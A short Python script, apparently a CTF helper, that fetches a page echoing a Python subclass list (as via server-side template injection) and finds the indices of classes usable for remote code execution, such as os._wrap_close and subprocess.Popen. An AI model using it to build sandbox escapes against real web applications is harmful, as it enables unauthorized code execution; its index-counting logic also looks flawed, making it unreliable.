#傻瓜式操作，输入你能回显子类的url
import re
import requests

def class_searching(classes_dict, input_str):
    match = re.findall(r'(&lt;.*?[^&][^l][^t][^;].*?&gt;)', input_str)
    count = 0
    for i in classes_dict:
        for j in match:
            pattern = r"&#.*?"+i+r"&#"
            if re.findall(pattern, j):
                class_match_dict[i] = count
                break
            else:
                count += 1
        count = 0
    if class_match_dict == {}:
        print("Not Found.")
    else:
        print("Found.")
    return class_match_dict

def request(url):
    res = requests.get(url=url)
    match = re.findall(r'(&lt;[cet][lny].*&gt;)', res.text)
    return match[0]

class_match_dict = {}
class_personal = {}
#此处可添加
class_RCE = {
    "os._wrap_close":"1",
    "warnings.WarningMessage":"2",
    "warnings.catch_warnings":"3",
    "site._Printer":"4",
    "file":"5",
    "subprocess.Popen":"6",
}
url = input("Input the url:")
methods=input(
"""Choose the following options:
1.Search for the specific class. (input it yourself,example:type)
2.Search for the class that could be used for RCE.
Input your choice:""")             #此处可扩展
if methods == "1":
    pclass = input("Input the class you want to search for:")
    class_personal[pclass] = "1"
    class_searching(classes_dict=class_personal, input_str=request(url=url))
if methods == "2":
    class_searching(classes_dict=class_RCE, input_str=request(url=url))
print(class_match_dict)
